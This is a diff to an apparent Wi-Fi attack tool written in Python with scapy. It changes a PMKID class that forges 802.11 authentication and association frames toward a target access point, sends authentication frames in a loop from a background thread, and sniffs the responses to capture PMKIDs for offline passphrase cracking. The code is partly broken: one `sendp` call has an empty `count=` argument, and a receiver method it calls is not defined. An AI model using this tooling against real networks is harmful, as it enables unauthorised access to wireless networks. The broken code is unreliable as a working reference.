@@ -28,6 +28,9 @@ from scapy.layers.eap   import EAPOL
 
 class PMKID:
 
+	__AUTHRUNNER = True
+	__AUTHSTATUS = True
+
 	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname):
 		self.interface  = iface
 		self.bssid      = bssid
@@ -43,12 +46,15 @@ class PMKID:
 		self.output     = self.output(outfname)
 
 	def output(self, fl):
-		if fl.endswith(".pmkid"):
-			return fl
-		elif fl.endswith("."):
-			return (fl + "pmkid")
+		if fl:
+			if fl.endswith(".pmkid"):
+				return fl
+			elif fl.endswith("."):
+				return (fl + "pmkid")
+			else:
+				return (fl + ".pmkid")
 		else:
-			return (fl + ".pmkid")
+			return False
 
 	def channeler(self):
 		ch = str(self.channel)
@@ -63,7 +69,7 @@ class PMKID:
 		return hwaddr
 
 	def forge_auth_frame(self, ap, cl):
-		pkt = RadioTap() / Dot11(
+		pkt = Dot11(
 				addr1=ap,
 				addr2=cl,
 				addr3=ap
@@ -71,38 +77,20 @@ class PMKID:
 				seqnum=1
 			)
 
+		return pkt
+
 	def forge_asso_frame(self, ap, cl):
 		def enum(pkt):
 			elts = pkt.getlayer(Dot11Elt)
-			retval, count = {}, 0
-
-			try:
-				while isinstance(elts[count], Dot11Elt):
-					if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 48 or elts[count].ID == 5 or elts[count].ID == 50 or elts[count].ID == 221:
-						retval[ elts[count].ID ] = {
-							'ID': elts[count].ID,
-							'len': elts[count].len,
-							'info': elts[count].info
-						}
-					count += 1
-			except IndexError:
-				pass
-
-			return retval
+			return elts
 
 		def form(efields, layer):
-			for identifier in list(efields.keys()):
-				if identifier == 0 or identifier == 1 or identifier == 5 or identifier == 48 or identifier == 50 or identifier == 221:
-					layer = layer / Dot11Elt(
-							ID=efields[identifier].get('ID'),
-							len=efields[identifier].get('len'),
-							info=efields[identifier].get('info')
-						)
-
-			return layer
+			retval = layer / efields
+				
+			return retval
 
 		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
-		pkt        = RadioTap() / Dot11(
+		pkt        = Dot11(
 							addr1=ap,
 							addr2=cl,
 							addr3=ap
@@ -110,11 +98,25 @@ class PMKID:
 							cap=capibility,
 							listen_interval=3
 						)
+
 		efields    = enum(self.beacon)
 		pkt        = form(efields, pkt)
 		return pkt
+
+	def auth_sender(self, pkt):
+		while self.__AUTHRUNNER:
+			sendp(
+				pkt,
+				count=
+			)
 
 	def engage(self):
 		myaddress  = self.get_my_address()
 		auth_frame = self.forge_auth_frame( self.bssid, myaddress )
 		asso_frame = self.forge_asso_frame( self.bssid, myaddress )
+
+		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
+		t.daemon = True
+		t.start()
+
+		sniff(iface=self.interface, prn=self.auth_receiver)
